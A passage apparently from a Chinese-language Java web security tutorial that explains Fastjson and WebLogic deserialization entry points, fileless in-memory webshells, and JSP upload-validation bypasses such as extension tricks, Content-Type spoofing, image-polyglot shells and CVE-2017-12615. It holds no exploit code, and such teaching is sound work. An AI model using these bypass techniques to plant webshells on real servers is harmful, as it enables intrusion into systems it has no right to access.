Fastjson autoType Fastjson 在解析 JSON 时，如果 JSON 里带有 @type 字段，它会尝试加载并实例化指定的类。autoType 机制的本意是支持多态，但它允许攻击者指定任意类。结合 classpath 上已有的 Gadget（比如 JdbcRowSetImpl），攻击者可以让 Fastjson 在反序列化 JSON 的过程中，间接走到 JNDI 注入或命令执行的路径上去。这里的攻击入口是 JSON 字符串。

WebLogic T3/XMLDecoder WebLogic 的 T3 协议在通信时会传输序列化对象，而早期版本没有对反序列化的内容做安全限制。XMLDecoder 则是另一个入口：它本意是把 XML 描述还原成对象，但如果 XML 里的类名可控，攻击者就可以指定 ProcessBuilder 之类的类来执行命令。这里的攻击入口是 T3 协议或 XML 输入。

这三类框架漏洞的共同点是：反序列化的入口从“一个显式的 readObject() 调用”扩散到了 Cookie、JSON、通信协议、XML 等各种看似无关的交互面。

内存马：反序列化的“后渗透延伸”

反序列化拿到命令执行往往不是终点。在 Tomcat 等 Web 容器中，攻击者可以利用反序列化链在运行时动态注册一个恶意的 Filter、Servlet 或 Listener，这就是“内存马”。它不落地任何文件，只存在于 JVM 内存中，传统的文件查杀很难发现。这体现了反序列化漏洞的另一个维度：它不仅可以执行一次命令，还可以实现持久化的、无文件落地的控制。

JSP 文件上传

JSP 文件上传漏洞的本质，建立在一个简单的容器行为上：Tomcat 等 Servlet 容器默认会把 .jsp 文件当作需要编译执行的动态资源。只要文件以 .jsp 结尾、落在 Web 应用目录下，访问对应的 URL 时，容器就会把它翻译、编译并执行。

因此，攻击目标非常明确：让一个包含恶意 Java 代码的 .jsp 文件通过上传点的校验，落到可以被访问的目录中。

绕过校验

上传功能的安全校验通常分几层，绕过思路也对应着攻击每一层的薄弱点：

前端校验 仅靠 JavaScript 检查文件后缀或 accept 属性。用 Burp Suite 拦截请求，把 filename="test.jpg" 改成 filename="shell.jsp"，前端校验完全失效。

黑名单绕过 服务端禁止 .jsp，但可能遗漏了同样会被容器解析的后缀。jspx、jspf 在某些配置下同样可以被当作 JSP 处理。此外还有 shell.jsp.（末尾加点）、shell.jsp%20（URL 编码空格）、shell.jsp::$DATA（Windows NTFS 流）等技巧，利用校验逻辑和文件系统解析之间的差异。

Content-Type 绕过 只检查 HTTP 头中的 Content-Type 是否为 image/jpeg。攻击者在上传 JSP 时把请求头改成 Content-Type: image/jpeg 即可。

文件内容检查（图片马） 检查文件幻数（Magic Number），要求文件头是图片格式。攻击者可以在一个正常 JPEG 文件末尾追加 JSP 代码，形成一个“图片马”。如果服务器还存在文件包含漏洞，或者某些解析配置缺陷，这个文件仍然可能被执行。

这些操作都和PHP的文件上传差不多。

解析漏洞：让“不该执行的”执行

有时候即使上传成功了，文件后缀不在黑名单里，按理说不应该被解析。但服务器本身的解析特性可能“帮”了攻击者。典型的例子是 Tomcat CVE-2017-12615：在特定配置下，Tomcat 允许通过 PUT 方法上传文件，并且存在 shell.jsp/ （末尾带斜杠）这样的路径可以被当作 JSP 解析的绕过方式。这类漏洞利用了容器对文件路径的解析规则与上传校验规则之间的不一致。
